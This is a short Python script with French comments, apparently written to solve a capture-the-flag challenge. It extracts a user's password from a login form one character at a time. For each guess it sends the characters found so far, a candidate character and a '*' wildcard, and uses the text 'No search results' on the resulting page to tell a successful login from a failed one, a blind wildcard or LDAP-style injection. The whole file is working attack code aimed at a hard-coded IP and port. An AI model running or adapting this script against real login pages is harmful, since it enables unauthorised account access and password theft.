import requests

#il va falloir essayer toutes les combinaisons de lettres avec * a la fin, si erreur il change de lettre snn il la met a la suite
#dans result puis il continue

list = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
'1','2','3','4','5','6','7','8','9','0','-','_','{','}','[',']','/','@','(',')',';','!','?','"','A','B','C','D',
'E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

result = ''
payload = '*'
data = {'username': 'Reese', 'password': 'var'}

url  = "http://46.101.86.93:32265/login"

flag = 1
while flag == 1:
    flag = 0
    for i in list :
        data['password'] = result + i + payload
        r = requests.post(url, data=data)
        if ('No search results' in r.text):#si est sur la page de recherche et que donc la connexion esst OK
            result += i 
            flag = 1 
            print(f'Aller hop ! : ' + result)
            break
print('FINIT !')